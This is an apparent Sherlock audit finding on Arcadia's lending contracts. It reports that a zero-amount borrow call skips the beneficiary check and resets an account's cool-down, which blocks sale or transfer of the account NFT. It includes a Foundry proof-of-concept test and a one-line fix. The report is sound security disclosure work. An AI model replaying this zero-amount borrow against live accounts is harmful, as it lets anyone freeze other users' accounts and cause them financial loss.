Upbeat Hazel Armadillo

medium

# An attacker could prevent the account from being transferred or sold on secondary markets

## Summary

Incorrect verification that the caller is the beneficiary allows anyone to trigger the cool-down period and prevent the account from being transferred.

## Vulnerability Detail

Arcadia mints an NFT for every account created by the factory.

The `AccountV1::transferOwnership` function uses a cool-down period to prevent any account action that might be disadvantageous to a new owner.

```solidity
modifier updateActionTimestamp() {
    lastActionTimestamp = uint32(block.timestamp);
    _;
}
// ...
function transferOwnership(address newOwner) external onlyFactory notDuringAuction {
    if (block.timestamp <= lastActionTimestamp + COOL_DOWN_PERIOD) revert AccountErrors.CoolDownPeriodNotPassed();

    // The Factory will check that the new owner is not address(0).
    owner = newOwner;
}
```

It is assumed that actions that trigger the cool-down period can only be performed by either the account owner or beneficiary.

However, the `LendingPool::borrow` function's check that `msg.sender` is the beneficiary can be bypassed if a zero amount is passed, because it only verifies that the amount is less or equal than the allowances.

```solidity
function borrow(uint256 amount, address account, address to, bytes3 referrer)
    external
    whenBorrowNotPaused
    processInterests
{
    // ...
    // Check allowances to take debt.
    if (accountOwner != msg.sender) {
        uint256 allowed = creditAllowance[account][accountOwner][msg.sender];
        if (allowed != type(uint256).max) {
            creditAllowance[account][accountOwner][msg.sender] = allowed - amountWithFee;
        }
    }
    // ...
}
```

Therefore, anyone can call this function on behalf of any account and trigger the cool-down period.

There is no need to front-run a transaction; calling it once during a cool-down period is sufficient. Such an attack can persist for a long time and will not incur significant costs on an L2 network.

## POC

Add the `POC.t.sol` file to the `lending-v2/test/fuzz/LendingPool/` folder. Run the test with `forge test --mc POC -vv`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {LendingPool_Fuzz_Test} from "./_LendingPool.fuzz.t.sol";
import {GuardianErrors} from "../../../../lib/accounts-v2/src/libraries/Errors.sol";

contract POC is LendingPool_Fuzz_Test {
    address newOwner = makeAddr("newOwner");

    function setUp() public override {
        LendingPool_Fuzz_Test.setUp();
    }

    function testTransferAccountSuccess() external {
        vm.warp(block.timestamp + 1 hours);

        uint256 id = factory.accountIndex(address(proxyAccount));

        vm.prank(users.accountOwner);
        factory.transferFrom(users.accountOwner, newOwner, id);

        assertEq(proxyAccount.owner(), newOwner);
    }

    function testTransferAccountRevert() external {
        vm.warp(block.timestamp + 1 hours);

        uint256 id = factory.accountIndex(address(proxyAccount));

        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        pool.borrow(0, address(proxyAccount), attacker, emptyBytes3);

        vm.prank(users.accountOwner);
        vm.expectRevert(GuardianErrors.CoolDownPeriodNotPassed.selector);
        factory.transferFrom(users.accountOwner, newOwner, id);
    }
}
```

## Impact

A user may be unable to transfer the account or sell it on the secondary market, leading to potential financial losses.

## Code Snippet

https://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L138-L141
https://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L265-L270
https://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L318
https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol#L426-L431

## Tool used

Manual Review

## Recommendation

```diff
diff --git a/lending-v2/src/LendingPool.sol b/lending-v2/src/LendingPool.sol
index b66de8e..54feea3 100644
--- a/lending-v2/src/LendingPool.sol
+++ b/lending-v2/src/LendingPool.sol
@@ -416,6 +416,7 @@ contract LendingPool is LendingPoolGuardian, Creditor, DebtToken, ILendingPool {
         whenBorrowNotPaused
         processInterests
     {
+        require(amount > 0);
         // If Account is not an actual address of an Account, ownerOfAccount(address) will return the zero address.
         address accountOwner = IFactory(ACCOUNT_FACTORY).ownerOfAccount(account);
         if (accountOwner == address(0)) revert LendingPoolErrors.IsNotAnAccount();
```
